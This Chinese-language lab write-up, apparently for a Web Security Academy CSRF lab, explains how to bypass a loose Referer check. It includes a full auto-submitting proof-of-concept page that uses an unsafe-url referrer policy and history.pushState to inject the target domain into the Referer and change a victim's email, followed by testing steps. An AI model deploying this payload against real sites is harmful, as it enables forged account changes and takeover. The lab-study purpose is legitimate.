1. 确认Referer校验行为：在Repeater中修改Referer为`https://靶场域名.testtest/my-account`，返回`Invalid referer header`，说明后端仅做包含匹配而非严格来源校验。
    
2. 在恶意HTML的`<head>`中添加`<meta name="referrer" content="unsafe-url">`，确保Referer包含完整URL。
    
3. 使用`history.pushState()`将当前页面URL改为包含目标域名的查询字符串：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://0a25001403cd058d80fec118000800de.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wakakakaka&#64;qq.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?https://0a25001403cd058d80fec118000800de.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**修正说明**：`<meta name="referrer" content="unsafe-url">`必须放在`<head>`中，不能放在`<body>`标签属性中（`<body Referrer-Policy: unsafe-url>`为非法语法，浏览器无法识别）。

托管该POC并诱使受害者访问，页面自动提交POST请求，Referer头为：

```
Referer: https://[攻击者托管页面]/?https://[靶场ID].web-security-academy.net
```

后端检测到Referer中包含目标域名，校验通过，邮箱即被篡改。

**与同类漏洞的区别：** 

相比依赖Referer缺失即绕过（Lab 10），此漏洞的校验逻辑**强制要求Referer存在**但**校验规则过于宽松**，属于“规则不严谨”而非“条件验证缺陷”。Lab 10中攻击者通过抑制Referer头绕过，本实验中攻击者通过“注入”合法域名到Referer中绕过。两者均揭示了基于Referer防御的脆弱性，但绕过思路不同——Lab 10是“无头可验”，本实验是“伪装合法来源”。

**测试方法：**

1. 使用Burp Repeater抓取更改邮箱的POST请求，修改Referer头为`https://靶场域名.testtest/my-account`，发送请求，观察返回`Invalid referer header`，确认后端进行包含匹配。
    
2. 在Repeater中修改Referer为`https://test.com?https://靶场域名`，发送请求，若成功则确认可通过Referer注入绕过。
    
3. 构建包含`<meta name="referrer" content="unsafe-url">`和`history.pushState()`的CSRF POC，托管后在Burp Proxy中观察发出的请求是否包含完整的Referer头（含查询字符串）。
    
4. 若无`<meta>`标签，浏览器可能截断Referer中的查询字符串（安全策略），导致注入失败，因此此步骤为必要条件。
